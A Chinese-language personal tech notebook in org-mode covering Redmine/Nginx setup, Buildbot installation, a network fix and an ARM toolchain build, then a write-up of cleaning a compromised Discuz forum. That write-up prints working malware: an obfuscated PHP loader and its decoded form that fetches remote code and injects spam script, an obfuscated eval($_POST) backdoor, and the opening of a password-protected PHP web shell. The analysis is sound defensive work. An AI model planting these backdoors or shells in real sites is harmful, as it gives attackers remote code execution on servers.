        mkdir -p tmp tmp/pdf public/plugin_assets
        sudo chown -R nobody:nobody files log tmp public/plugin_assets
        sudo chmod -R 755 files log tmp public/plugin_assets
      #+end_src

*** 试运行 =redmine=

    #+begin_src sh
      ruby script/rails server webrick -e production
    #+end_src

    - 浏览器打开页面
      
      [[http://localhost:3000]]

      使用 用户名 =admin= ，密码 =admin= 登录后，立即修改密码。
  
      使用下面的命令生成随机的密码：
      
      #+begin_src sh
        cat /dev/urandom | head -1 | md5sum | head -c 8
      #+end_src

*** 配置 =redmine=

    - 修改 =config/settings.yml=
      
*** 使用 =Nginx= 和 =passenger=

    #+begin_src sh
      wget 'http://nginx.org/download/nginx-1.4.6.tar.gz'
      tar xzvf nginx-1.4.6.tar.gz
      gem install passenger
      yum install pcre-devel
      passenger-install-nginx-module
    #+end_src

    - 交互式安装过程

      + Automatically download and install Nginx?
        
        选 2. No: I want to customize my Nginx installation. (for advanced users)
  
      + Where is your Nginx source code located?
        
        填解压的 =nginx= 源码包路径
  
      + Where do you want to install Nginx to?
  
        填 =/usr/local/nginx=
  
    - 修改 /usr/local/nginx/conf/nginx.conf
  
        在最后的 =}= 前添加以下配置
  
        #+begin_example
          include vhosts/*.conf;
        #+end_example
        
    - 添加站点配置文件 =/usr/local/nginx/conf/vhosts/redmine.conf=
  
        #+begin_example
          server {
            listen  80;
            server_name <域名>;
            root <redmine根目录>/public;
            passenger_enabled on;
            client_max_body_size 10m; # Max attachemnt size
          }
        #+end_example

    - 启动 =nginx=
      
      #+begin_src sh       
        /usr/local/nginx/sbin/nginx
      #+end_src

    - 现在可以正式访问站点了

      http://<域名>

*** 支持 =OpenID= 第三方帐号登录

    - 安装 =openid= 库

      #+begin_src sh
        gem install ruby-openid
      #+end_src

    - 使用 =admin= 帐号登录系统，在“管理 - 配置 - 认证”中勾选上“允许使用OpenID登录和注册”。 

    - 用户注册时“密码”可以省略， 填上 =OpenID URL= 即可。

    - 如何获得Google的OpenID URL？
      
      + 先在 =Google= 的站点上登录
      + 打开 [[https://profiles.google.com]] 后会跳转到类似这样（ =https://plus.google.com/000000000000000000000/posts= ）的网页
      + 你的 =OpenID URL= 为 http://profiles.google.com/000000000000000000000
  
      上面的 =000000000000000000000= 可能为任意的数字串
    
    - 管理员确认注册后即可在登录界面上输入 =OpenID URL= 直接登录
      
      一般浏览器的输入框是有记忆功能的，双击后会出现输入历史下拉列表，直接选择即可。

    - 安装插件简化 =OpenID= 登录
      
      + [[https://github.com/jorgebg/redmine-openid-selector]] （不推荐） 为原始分枝，在 =redmine-2.5.0= 下不能直接安装会导致站点登录界面出现404错误，解决方案在 [[http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778][这里]] ，简而言之就是把插件目录名中的 =-= 改为 =_= 。
        
      + [[https://github.com/computerminds/redmine\_openid\_selector]] （不推荐） 这个分枝安装后可用，但界面为英文（其实界面就一句英文）。
      
      + https://github.com/tangxinfa/redmine\_openid\_selector （推荐） 为支持中文我fork了上一个分枝。
    
      + 通用的插件安装过程：

        #+begin_src sh
          cd plugins
          git clone https://github.com/tangxinfa/redmine_openid_selector.git
          rake redmine:plugins:migrate RAILS_ENV=production
          touch tmp/restart.txt
        #+end_src

      + 通用的插件卸载过程：
      
        #+begin_src sh
          rake redmine:plugins:migrate NAME=redmine-openid-selector VERSION=0 RAILS_ENV=production
          rm -rf plugins/redmine-openid-selector
          touch tmp/restart.txt
        #+end_src      
     
      现在在登录及注册页面直接点击第三方站点Logo即可。

*** 样式美化

    #+begin_src sh
      git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-cookers
      touch tmp/restart.txt
    #+end_src

    现在可以使用 =admin= 登录后台，在“管理 - 配置 - 显示 - 主题”中启用主题 =Pixel-cookers= 。

** TODO Archlinux下安装Buildbot                             :python:Buildbot:
   
*** 安装Buildbot

    参照 [[http://docs.buildbot.net/current/tutorial/firstrun.html][官方文档]] 进行安装：

    - 安装基础软件

      #+begin_src sh
        sudo easy_install-2.7 virtualenv
        virtualenv-2.7 --no-site-packages sandbox
        source sandbox/bin/activate
        easy_install sqlalchemy==0.7.10
        easy_install buildbot
      #+end_src
   
    - 安装运行Master

      #+begin_src sh
        buildbot create-master master
        mv master/master.cfg.sample master/master.cfg
        buildbot start master
        tail -f master/twistd.log &
      #+end_src
      
    - 安装运行Slave

      #+begin_src sh
        easy_install buildbot-slave
        buildslave create-slave slave localhost:9989 example-slave pass
        buildslave start slave
        tail -f slave/twistd.log &
      #+end_src

    - 打开界面

      [[http://localhost:8010/]]

** DONE Archlinux网络接口上出现两个IP                     :archlinux:network:
   CLOSED: [2014-03-12 Wed 11:32]

   - 发现两个IP

     我的电脑是直接连到公司的墙上的网口上网的，在测试路由器的时候，我把路由器的WAN口接墙上的网口，然后电脑连到路由器的LAN口上，上网正常。查看分配到的IP为192.168.111.2，路由器的IP为192.168.111.1， 想到我一直用 =192.168.90.73= 这个IP，有些配置也依赖这个IP，所以还想分到这个IP，所以把路由器的DHCP做了设置，路由器IP改为192.168.90.74，分配的IP范围为192.168.90.71-192.168.90.73，再次重连电脑分配的IP为192.168.90.71，然后发现上不了网了，浏览器上输入路由器的IP（192.168.90.74）竟然打开了我机器（192.168.90.71）上建的WEB服务，其他人连这个网络却可以通过192.168.90.74这个IP正常打开路由器界面，最终通过“ip address show”这个命令发现我的网口上有两个IP（192.168.90.71、192.168.90.74），=ipconfig= 和其它GUI工具只能看到第一个IP。

   - 第二个IP是怎么来的？

     抓包分析了一下DHCP网络包，只给分配了192.168.90.71这个IP，看来192.168.90.74这个IP是我机器上配置的，于是搜索/etc、/var下的文件，最后在/var/log/journal/*/system.journal中找到了日志：

     #+begin_example
       NetworkManager[375]: <debug> [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'
     #+end_example

     然后在NetworkManager的配置文件 =/etc/NetworkManager/system-connections/Profile 1= 中找到了相关配置：
    
     #+begin_example
       [ipv4]
       method=auto
       address1=192.168.90.74/24,192.168.90.2
     #+end_example

     删除掉 =address1= 后，再重连网络，就只有一个IP了。

** TODO 在Arm板开发最简单的程序                                   :linux:arm:

   - 查看Arm板型号
   
     #+begin_example
       # uname -m
       armv7l
     #+end_example

   - 我的工作环境

     #+begin_example
       $ uname -a
       Linux tangxinfa-archlinux 3.13.6-1-ARCH #1 SMP PREEMPT Fri Mar 7 22:47:48 CET 2014 x86_64 GNU/Linux
     #+end_example

   - 编译低版本的 =texinfo=

     #+begin_src sh
       wget http://ftp.gnu.org/gnu/texinfo/texinfo-4.13a.tar.gz
       tar -zxvf texinfo-4.13a.tar.gz
       cd texinfo-4.13
       ./configure
       make
       cd ..
     #+end_src

   - 下载低版本的 =texlive=

     #+begin_src sh
       wget ftp://tug.org/historic/systems/texlive/2009/texlive-20091107-bin.tar.xz
       tar xJvf texlive-20091107-bin.tar.xz
     #+end_src
   
   - 下载Gcc-Arm-Embedded并编译好

     #+begin_src sh
       export PATH=`pwd`/texinfo-4.13/makeinfo:`pwd`/texlive-20091107-bin/x86_64-linux:$PATH
       wget 'https://launchpad.net/gcc-arm-embedded/4.8/4.8-2013-q4-major/+download/gcc-arm-none-eabi-4_8-2013q4-20131204-src.tar.bz2'
       tar xjvf gcc-arm-none-eabi-4_8-2013q4-20131204-src.tar.bz2
       cd gcc-arm-none-eabi-4_8-2013q4-20131204/src
       find -name "*.tar.*" | xargs -I% tar -xf %
       cd zlib-1.2.5/
       patch -p1 <../zlib-1.2.5.patch 
       cd ../../
       ./build-prerequisites.sh --skip_mingw32
       ./build-toolchain.sh --skip_mingw32
     #+end_src

     以上过程参考《gcc-arm-none-eabi-4_8-2013q4-20131204/How-to-build-toolchain.pdf》

** TODO linux下遭遇进程状态“D”                                      :linux:

   - 进程状态“D”介绍

     + 解释1 :: uninterruptible sleep (usually IO)。不可中断的睡眠（通常是因为IO）。
     
     + 解释2 :: Disk Sleep。磁盘睡眠。
     
     通常由进程阻塞式的发起了IO操作（read、write）

     
** DONE 论坛被挂暗链问题分析与解决                      :discuz:security:web:
   CLOSED: [2014-04-01 Tue 21:38]

*** 发现问题
    
    有网友反映我们的论坛被挂了暗链，具体表现为从 =google= 搜索论坛名称结果如下图所示：
 
    [[file:static/site_attacked.png]]
    
    直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 =google= 搜索结果访问会跳到恶意网站，

*** 解决问题

    直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
 
    - 在代码和数据库dump结果中搜索恶意站点信息，一无所获
 
    - 然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 =firefox= 插件 =ImageBlock= 让浏览器不加载图片，可是问题依旧
      
    - 打开 =firebug= 的 =Network= 标签，在页面加载记录中发现一个异常的js加载： =http://api.discuz.com.de/Seo.js= 
      
      在代码和数据库中搜索这个js找不到任何信息。
 
      + 将恶意站点配置一条 =hosts= 

        #+begin_example
            127.0.0.1 api.discuz.com.de
        #+end_example
 
      浏览器不再自动跳转到恶意网站了。 
 
    - 从 =google= 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

      #+begin_src html
        <div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>
      #+end_src
 
    - 在php脚本中加入 =echo= 语句逐步缩小范围，最终发现问题由下面一条语句引起
 
      #+begin_src php
        INCLUDE(pack('H*','2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'));
      #+end_src
 
      上面的语句引入了 =/var/tmp/.SYSDUMP/.Wh0AmI.CORE= 脚本。
 
      删除该语句后问题解决。

*** 分析恶意代码

    - =/var/tmp/.SYSDUMP/.Wh0AmI.CORE=

     #+begin_src php
       <?php $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>
     #+end_src
     
    - 参考 [[http://blog.i1728.com/post/99.html][网上方法]] 解码的结果

     #+begin_src php
       <?php
       /*
       ,*author:whoami
       ,*  QQ  :4892057
       ,*/
       error_reporting(0);
       $fileDir = '/var/tmp/.SYSDUMP/';
       $IP=$_SERVER['REMOTE_ADDR'];
       $Bot=$_SERVER['HTTP_USER_AGENT'];
       $Ref=$_SERVER['HTTP_REFERER'];
       $KIP=array('117.28.255.37','116.55.241.24','125.64.94.219','119.147.114.213','118.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');
       $KBot=array('Baiduspider','Googlebot','Yahoo','Bingbot','Sosospider','Sogou','360Spider','YoudaoBot');
       $Key=array('anquan.org','google.com','soso.com','%e8%b5%8c','%e9%aa%b0','%e9%b1%bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');
       function dec0de($fileDir,$data){
       $dataArr = explode(':',$data);
           $Keys = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[0]))));
           $News = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[1]))));
           $Links= explode(':',base64_decode(str_rot13(pack('H*',$dataArr[2]))));
           @include($fileDir.'.Wh0AmI.MODEL');die;
       }
       function getdata($data_url){
       if (function_exists('curl_exec')) {
       $sp_curl = @curl_init();
       curl_setopt($sp_curl, CURLOPT_URL, $data_url);
       curl_setopt($sp_curl, CURLOPT_HEADER, 0);
       curl_setopt($sp_curl, CURLOPT_CONNECTTIMEOUT, 5);
       curl_setopt($sp_curl, CURLOPT_RETURNTRANSFER, 1);
       $contents = @curl_exec($sp_curl);
       @curl_close($sp_curl);
       }elseif(function_exists('stream_context_create')) {
       $sp_cont = array('http' => array('method' => 'GET','timeout' => 5));
       $sp_stre = @stream_context_create($sp_cont);
       $contents = @file_get_contents($data_url, false, $sp_stre);
       }else{
       $handle = @fopen($data_url, "rb"); 
       $contents = @stream_get_contents($handle); 
       @fclose($handle);
       }
       return $contents;
       }
       function show($fileDir){
       $filename=$fileDir.md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
       if(is_file($filename)){
           $fp=@fopen($filename,'r');
           $data=@fread($fp,filesize($filename));
           @fclose($fp);
           if(empty($data)) {@unlink($filename);return;}
           dec0de($fileDir,$data);
       } else {
           $data=getdata('http://bet.discuz.com.de/w0shiOo7.php?HOST='.$_SERVER['HTTP_HOST']);
           $fp=@fopen($filename,'w');
           @fwrite($fp,$data);
           @fclose($fp);
           if(strlen($data) > 1000) {
           dec0de($fileDir,$data);
           }
       }}
       if(!in_array($IP,$KIP)){
       foreach($KBot as $KBots){if(stristr($Bot,$KBots)){
       show($fileDir);
       }}foreach($Key as $Keys){
       if(stristr($Ref,$Keys)){
       echo "<div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>";}}}      
     #+end_src
      
    上面代码的目的就是下载恶意代码并执行。  

*** 继续排查

    通过比较svn中的代码与现网的代码还发现了一个新的后门程序

    - =uc_client/control/class.php=

      #+begin_src php
        <?php $mt="mFsKCleRfU"; $ojj="IEBleldle"; $hsa="E9TVFsnd2VuJ10p"; $fnx="Ow=="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>
      #+end_src

      解码后的结果

      #+begin_src php
        @eval($_POST['wen']);
      #+end_src
    
      上面的脚本可以注入任意的代码。

    - =./uc_server/data/tmp/angel.php=

      #+begin_src php
        <?php
        error_reporting(7);
        @set_magic_quotes_runtime(0);
        ob_start();
        $mtime = explode(' ', microtime());
        $starttime = $mtime[1] + $mtime[0];
        define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
        define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
        define('IS_COM', class_exists('COM') ? 1 : 0 );
        define('IS_GPC', get_magic_quotes_gpc());
        $dis_func = get_cfg_var('disable_functions');
        define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
        @set_time_limit(0);@preg_replace("/[email]/e",$_POST['Id'],"error");
        
        foreach($_POST as $key => $value) {
            if (IS_GPC) {
                $value = s_array($value);
            }
            $$key = $value;
        }
        /*===================== 程序配置 =====================*/
        
        //echo encode_pass('angel');exit;
        //angel = ec38fe2a8497e0a8d6d349b3533038cb
        // 如果需要密码验证,请修改登陆密码,留空为不需要验证
        $pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel
        
        //如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
        // cookie 前缀
        $cookiepre = '';
        // cookie 作用域
        $cookiedomain = '';
        // cookie 作用路径
        $cookiepath = '/';
        // cookie 有效期
        $cookielife = 86400;
        
        //程序搜索可写文件的类型
        !$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
        /*===================== 配置结束 =====================*/
        
        $charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
        if ($charset == 'utf8') {
            header("content-Type: text/html; charset=utf-8");
        } elseif ($charset == 'big5') {
            header("content-Type: text/html; charset=big5");
        } elseif ($charset == 'gbk') {
            header("content-Type: text/html; charset=gbk");
        } elseif ($charset == 'latin1') {
            header("content-Type: text/html; charset=iso-8859-2");
        } elseif ($charset == 'euc-kr') {
            header("content-Type: text/html; charset=euc-kr");
        } elseif ($charset == 'euc-jp') {
            header("content-Type: text/html; charset=euc-jp");
        }
        
        $self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
        $timestamp = time();
        
        /*===================== 身份验证 =====================*/
        if ($action == "logout") {
            scookie('loginpass', '', -86400 * 365);
            @header('Location: '.$self);
            exit;
        }
        if($pass) {
            if ($action == 'login') {
                if ($pass == encode_pass($password)) {
                    scookie('loginpass',encode_pass($password));
                    @header('Location: '.$self);
                    exit;
                }
            }
            if ($_COOKIE['loginpass']) {
                if ($_COOKIE['loginpass'] != $pass) {
                    loginpage();
                }
            } else {
                loginpage();
            }
        }
        /*===================== 验证结束 =====================*/
        
        $errmsg = '';
        !$action && $action = 'file';
        
        // 查看PHPINFO
        if ($action == 'phpinfo') {
            if (IS_PHPINFO) {
